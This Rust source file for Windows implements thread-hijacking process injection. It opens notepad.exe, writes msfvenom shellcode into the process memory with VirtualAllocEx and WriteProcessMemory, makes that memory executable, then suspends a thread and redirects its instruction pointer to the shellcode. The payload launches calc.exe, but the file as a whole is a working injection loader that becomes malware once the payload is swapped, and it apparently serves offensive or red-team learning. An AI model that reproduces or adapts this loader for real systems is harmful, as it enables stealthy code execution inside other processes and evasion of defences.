use sysinfo::{PidExt, ProcessExt, System, SystemExt};
use windows::core::{Error, Result};
use windows::Win32::Foundation::{E_FAIL, HANDLE};
use windows::Win32::System::{
    Memory::*,
    Threading::*,
    Diagnostics::{
        Debug::*,
        ToolHelp::*,
    },
};

// https://github.com/microsoft/win32metadata/issues/1044
#[repr(align(16))]
#[derive(Default)]
struct AlignedContext {
    ctx: CONTEXT
}

fn main() -> Result<()> {
    // msfvenom -p windows/x64/exec CMD=calc.exe -f rust
    let shellcode: [u8; 276] = [
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
        0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
        0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
        0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
        0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
        0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
        0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
        0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
        0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
        0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
        0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
        0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
        0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
    ];

    unsafe {
        // Locate the target process by name
        println!("[+] Searching for the process handle");
        let process = find_process("notepad.exe")?;
        let hprocess = process.0;
        let pid = process.1;
    
        // Locate one thread within the target process to hijack
        println!("[+] Searching for the thread handle");
        let hthread = find_thread(pid)?;
    
        // Allocate RW memory in the remote process for the shellcode
        let address = VirtualAllocEx(hprocess, None, shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if address.is_null() {
            return Err(Error::new(E_FAIL, "VirtualAlloc Failed".into()));
        }
    
        // Write the shellcode into the remote process memory
        println!("[+] Writing the shellcode");
        let mut return_len = 0;
        WriteProcessMemory(
            hprocess,
            address,
            shellcode.as_ptr().cast(),
            shellcode.len(),
            Some(&mut return_len),
        )?;
    
        // Change memory protection to executable (RX)
        let mut oldprotect = PAGE_PROTECTION_FLAGS(0);
        VirtualProtectEx(
            hprocess,
            address,
            shellcode.len(),
            PAGE_EXECUTE_READWRITE,
            &mut oldprotect,
        )?;
    
        let mut ctx_thread = AlignedContext {
            ctx: CONTEXT {
                ContextFlags: CONTEXT_ALL_AMD64,
                ..Default::default()
            }
        };
    
        // Suspend the thread to safely modify its execution context
        println!("[+] Stopping the thread");
        SuspendThread(hthread);
        
        // Retrieve the current thread context
        println!("[+] Retrieving the thread context");
        GetThreadContext(hthread, &mut ctx_thread.ctx)?;
    
        // Overwrite RIP to point to the injected shellcode
        println!("[+] Setting the thread context");
        ctx_thread.ctx.Rip = address as u64;
        SetThreadContext(hthread, &ctx_thread.ctx)?;
    
        // Resume the thread and wait for execution
        println!("[+] Thread Executed!");
        ResumeThread(hthread);
        WaitForSingleObject(hthread, INFINITE);
    }

    Ok(())
}

/// Finds a process by its executable name and opens it with full access rights.
///
/// # Parameters
///
/// * `name` - The name of the process to search for (e.g., `"notepad.exe"`).
///
/// # Returns
///
/// * `Ok((HANDLE, u32))` - A tuple containing the process handle and its PID.
/// * `Err` - If the process is not found or cannot be opened.
fn find_process(name: &str) -> Result<(HANDLE,u32)> {
    let mut system = System::new_all();
    system.refresh_all();

    let processes = system
        .processes()
        .values()
        .filter(|process| process.name().to_lowercase() == name)
        .collect::<Vec<_>>();

    if let Some(process) = processes.into_iter().next() {
        println!("[-] Process with PID found: {}", process.pid());
        let hprocess = unsafe { OpenProcess(PROCESS_ALL_ACCESS, false, process.pid().as_u32())? };
        return Ok((hprocess, process.pid().as_u32()));
    }

    Err(Error::new(E_FAIL, "Error finding process PID!".into()))
}

/// Finds and opens a thread belonging to the specified process ID (PID).
///
/// # Parameters
///
/// * `pid` - The process ID to search for a thread in.
///
/// # Returns
///
/// * `Ok(HANDLE)` - A handle to the found thread.
/// * `Err` - If no thread for the given PID is found or cannot be opened.
fn find_thread(pid: u32) -> Result<HANDLE> {
    let snapshot =  unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)? };
    let mut entry = THREADENTRY32 {
        dwSize: size_of::<THREADENTRY32>() as u32,
        ..Default::default()
    };

    if unsafe { Thread32First(snapshot, &mut entry).is_ok() } {
        loop {
            if entry.th32OwnerProcessID == pid {
                return unsafe { OpenThread(THREAD_ALL_ACCESS, false, entry.th32ThreadID) };
            }

            if unsafe { Thread32Next(snapshot, &mut entry).is_err() } {
                break;
            }
        }
    }

    Err(Error::new(E_FAIL, "Thread not found".into()))
}

// Example of a function to create a thread
// unsafe extern "system" fn function(_param: *mut c_void) -> u32 {
//     let a = 1 + 1;
//     return a;
// }
